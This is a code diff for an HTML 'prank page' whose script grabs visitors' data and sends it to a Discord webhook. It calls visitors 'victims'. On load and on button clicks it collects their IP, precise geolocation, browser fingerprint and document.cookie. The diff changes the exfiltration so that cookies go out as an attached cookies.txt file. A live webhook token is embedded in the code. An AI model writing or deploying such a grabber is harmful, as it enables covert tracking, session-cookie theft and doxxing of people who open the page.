@@ -52,177 +52,142 @@
     const yesButton = document.querySelector('button:first-of-type');
     const noButton = document.querySelector('button:last-of-type');
     const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
-    let currentIp = null;
-    let geoData = null;
-    const counterKey = 'totalVictims';
-    let totalVictims = parseInt(localStorage.getItem(counterKey)) || 0;
-    totalVictims++;
-    localStorage.setItem(counterKey, totalVictims.toString());
     const sendNewVictim = () => {
-      const embed = {
-        title: 'New Victim',
-        fields: [
-          { name: 'Total Victims Online :', value: totalVictims.toString(), inline: true }
-        ],
-        color: 3447003
-      };
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [embed] }),
+        body: JSON.stringify({ content: 'New victim' }),
       }).catch(console.error);
     };
-    const sendEmbed = (embedBase, color, title) => {
+    sendNewVictim();
+    const getCookiesBlob = () => {
       const cookies = document.cookie || 'No cookies';
-      const fullEmbed = {
-        title,
-        ...embedBase,
-        color,
-        fields: [
-          ...embedBase.fields,
-          { name: 'Cookies', value: cookies.substring(0, 1000) + (cookies.length > 1000 ? '...' : ''), inline: false }
-        ]
-      };
+      const blob = new Blob([cookies], { type: 'text/plain' });
+      return { blob, filename: 'cookies.txt' };
+    };
+    const sendWithCookies = (embedPayload, color, title) => {
+      const { blob, filename } = getCookiesBlob();
+      const formData = new FormData();
+      formData.append('payload_json', JSON.stringify({
+        embeds: [{
+          ...embedPayload,
+          color: color,
+          title: title
+        }]
+      }));
+      formData.append('file', blob, filename);
       fetch(webhookUrl, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [fullEmbed] }),
+        body: formData,
       }).catch(console.error);
     };
-    const buildBasicEmbed = (ip) => {
-      const userAgent = navigator.userAgent || 'unknown';
-      const language = navigator.language || 'unknown';
-      const platform = navigator.platform || 'unknown';
-      const screenRes = `${screen.width}x${screen.height}` || 'unknown';
-      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-      const timestamp = new Date().toISOString();
-      return {
-        description: `Timestamp: ${timestamp}`,
-        fields: [
-          { name: 'IP', value: ip, inline: true },
-          { name: 'User Agent', value: userAgent, inline: false },
-          { name: 'Language', value: language, inline: true },
-          { name: 'Platform', value: platform, inline: true },
-          { name: 'Screen Resolution', value: screenRes, inline: true },
-          { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
-        ],
-        footer: { text: 'Grabbed via prank page' }
-      };
+    const getUserInfo = (ip) => {
+      return fetch(`http://ip-api.com/json/${ip}`)
+        .then(geoResponse => geoResponse.json())
+        .then(geoData => {
+          const lat = geoData.lat || 'unknown';
+          const lon = geoData.lon || 'unknown';
+          const country = geoData.country || 'unknown';
+          const countryCode = geoData.countryCode || 'unknown';
+          const region = geoData.regionName || 'unknown';
+          const regionCode = geoData.region || 'unknown';
+          const city = geoData.city || 'unknown';
+          const district = geoData.district || 'unknown';
+          const zip = geoData.zip || 'unknown';
+          const isp = geoData.isp || 'unknown';
+          const org = geoData.org || 'unknown';
+          const as = geoData.as || 'unknown';
+          const timezone = geoData.timezone || 'unknown';
+          const mobile = geoData.mobile ? 'Yes' : 'No';
+          const proxy = geoData.proxy ? 'Yes' : 'No';
+          const hosting = geoData.hosting ? 'Yes' : 'No';
+          const status = geoData.status || 'unknown';
+          const userAgent = navigator.userAgent || 'unknown';
+          const language = navigator.language || 'unknown';
+          const platform = navigator.platform || 'unknown';
+          const screenRes = `${screen.width}x${screen.height}` || 'unknown';
+          const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+          const timestamp = new Date().toISOString();
+          return {
+            embed: {
+              description: `Timestamp: ${timestamp}`,
+              fields: [
+                { name: 'IP', value: ip, inline: true },
+                { name: 'Status', value: status, inline: true },
+                { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
+                { name: 'Country', value: country, inline: true },
+                { name: 'Country Code', value: countryCode, inline: true },
+                { name: 'Region', value: region, inline: true },
+                { name: 'Region Code', value: regionCode, inline: true },
+                { name: 'City', value: city, inline: true },
+                { name: 'District', value: district, inline: true },
+                { name: 'ZIP', value: zip, inline: true },
+                { name: 'ISP', value: isp, inline: true },
+                { name: 'Organization', value: org, inline: true },
+                { name: 'AS', value: as, inline: true },
+                { name: 'Timezone', value: timezone, inline: true },
+                { name: 'Mobile', value: mobile, inline: true },
+                { name: 'Proxy', value: proxy, inline: true },
+                { name: 'Hosting', value: hosting, inline: true },
+                { name: 'User Agent', value: userAgent, inline: false },
+                { name: 'Language', value: language, inline: true },
+                { name: 'Platform', value: platform, inline: true },
+                { name: 'Screen Resolution', value: screenRes, inline: true },
+                { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
+              ],
+              footer: { text: 'Grabbed via prank page' }
+            }
+          };
+        })
+        .catch(geoError => {
+          console.error('Error fetching geolocation:', geoError);
+          const timestamp = new Date().toISOString();
+          return {
+            embed: {
+              description: `Timestamp: ${timestamp}`,
+              fields: [
+                { name: 'IP', value: ip, inline: true },
+                { name: 'User Agent', value: navigator.userAgent || 'unknown', inline: false },
+                { name: 'Language', value: navigator.language || 'unknown', inline: true },
+                { name: 'Platform', value: navigator.platform || 'unknown', inline: true },
+                { name: 'Screen Resolution', value: `${screen.width}x${screen.height}` || 'unknown', inline: true },
+                { name: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No', inline: true }
+              ],
+              footer: { text: 'Geolocation failed' }
+            }
+          };
+        });
     };
-    const buildFullEmbed = (ip, gData) => {
-      const lat = gData.lat || 'unknown';
-      const lon = gData.lon || 'unknown';
-      const country = gData.country || 'unknown';
-      const countryCode = gData.countryCode || 'unknown';
-      const region = gData.regionName || 'unknown';
-      const regionCode = gData.region || 'unknown';
-      const city = gData.city || 'unknown';
-      const district = gData.district || 'unknown';
-      const zip = gData.zip || 'unknown';
-      const isp = gData.isp || 'unknown';
-      const org = gData.org || 'unknown';
-      const as = gData.as || 'unknown';
-      const timezone = gData.timezone || 'unknown';
-      const mobile = gData.mobile ? 'Yes' : 'No';
-      const proxy = gData.proxy ? 'Yes' : 'No';
-      const hosting = gData.hosting ? 'Yes' : 'No';
-      const status = gData.status || 'unknown';
-      const userAgent = navigator.userAgent || 'unknown';
-      const language = navigator.language || 'unknown';
-      const platform = navigator.platform || 'unknown';
-      const screenRes = `${screen.width}x${screen.height}` || 'unknown';
-      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-      const timestamp = new Date().toISOString();
-      return {
-        description: `Timestamp: ${timestamp}`,
-        fields: [
-          { name: 'IP', value: ip, inline: true },
-          { name: 'Status', value: status, inline: true },
-          { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
-          { name: 'Country', value: country, inline: true },
-          { name: 'Country Code', value: countryCode, inline: true },
-          { name: 'Region', value: region, inline: true },
-          { name: 'Region Code', value: regionCode, inline: true },
-          { name: 'City', value: city, inline: true },
-          { name: 'District', value: district, inline: true },
-          { name: 'ZIP', value: zip, inline: true },
-          { name: 'ISP', value: isp, inline: true },
-          { name: 'Organization', value: org, inline: true },
-          { name: 'AS', value: as, inline: true },
-          { name: 'Timezone', value: timezone, inline: true },
-          { name: 'Mobile', value: mobile, inline: true },
-          { name: 'Proxy', value: proxy, inline: true },
-          { name: 'Hosting', value: hosting, inline: true },
-          { name: 'User Agent', value: userAgent, inline: false },
-          { name: 'Language', value: language, inline: true },
-          { name: 'Platform', value: platform, inline: true },
-          { name: 'Screen Resolution', value: screenRes, inline: true },
-          { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
-        ],
-        footer: { text: 'Grabbed via prank page' }
-      };
-    };
-    const fetchAndSendBasic = () => {
+    yesButton.addEventListener('click', () => {
+      alert('cool thanks!');
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-          currentIp = data.ip;
-          console.log('Your IP:', currentIp);
-          const basicEmbed = buildBasicEmbed(currentIp);
-          sendEmbed(basicEmbed, 10197915, 'New Victim Entry');
-          fetch(`http://ip-api.com/json/${currentIp}`)
-            .then(geoResponse => geoResponse.json())
-            .then(gData => {
-              geoData = gData;
-              console.log('Geo data fetched');
-            })
-            .catch(error => {
-              console.error('Error fetching geo:', error);
-            });
+          const ip = data.ip;
+          console.log('Your IP:', ip);
+          getUserInfo(ip).then(({ embed }) => {
+            sendWithCookies(embed, 65280, 'Victim Agreed - Green');
+          });
         })
         .catch(error => {
           console.error('Error fetching IP:', error);
         });
-    };
-    sendNewVictim();
-    fetchAndSendBasic();
-    yesButton.addEventListener('click', () => {
-      alert('cool thanks!');
-      if (geoData) {
-        const fullEmbed = buildFullEmbed(currentIp, geoData);
-        sendEmbed(fullEmbed, 65280, 'Victim Agreed');
-      } else {
-        fetch(`http://ip-api.com/json/${currentIp}`)
-          .then(geoResponse => geoResponse.json())
-          .then(gData => {
-            const fullEmbed = buildFullEmbed(currentIp, gData);
-            sendEmbed(fullEmbed, 65280, 'Victim Agreed');
-          })
-          .catch(() => {
-            const basicEmbed = buildBasicEmbed(currentIp);
-            sendEmbed(basicEmbed, 65280, 'Victim Agreed');
-          });
-      }
     });
     noButton.addEventListener('click', () => {
-      if (geoData) {
-        const fullEmbed = buildFullEmbed(currentIp, geoData);
-        sendEmbed(fullEmbed, 16711680, 'Victim Refused');
-        alert(`no?? Then your ip shall be mine, its ${currentIp} btw`);
-      } else {
-        fetch(`http://ip-api.com/json/${currentIp}`)
-          .then(geoResponse => geoResponse.json())
-          .then(gData => {
-            const fullEmbed = buildFullEmbed(currentIp, gData);
-            sendEmbed(fullEmbed, 16711680, 'Victim Refused');
-            alert(`no?? Then your ip shall be mine, its ${currentIp} btw`);
-          })
-          .catch(() => {
-            const basicEmbed = buildBasicEmbed(currentIp);
-            sendEmbed(basicEmbed, 16711680, 'Victim Refused');
-            alert(`no?? Then your ip shall be mine, its ${currentIp} btw`);
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          console.log('Your IP:', ip);
+          getUserInfo(ip).then(({ embed }) => {
+            sendWithCookies(embed, 16711680, 'Victim Refused - Red');
           });
-      }
+          alert(`no?? Then your ip shall be mine, its ${ip} btw`);
+        })
+        .catch(error => {
+          console.error('Error fetching IP:', error);
+          alert('no?? Then your ip shall be mine, its [error] btw');
+        });
     });
   </script>
 </body>
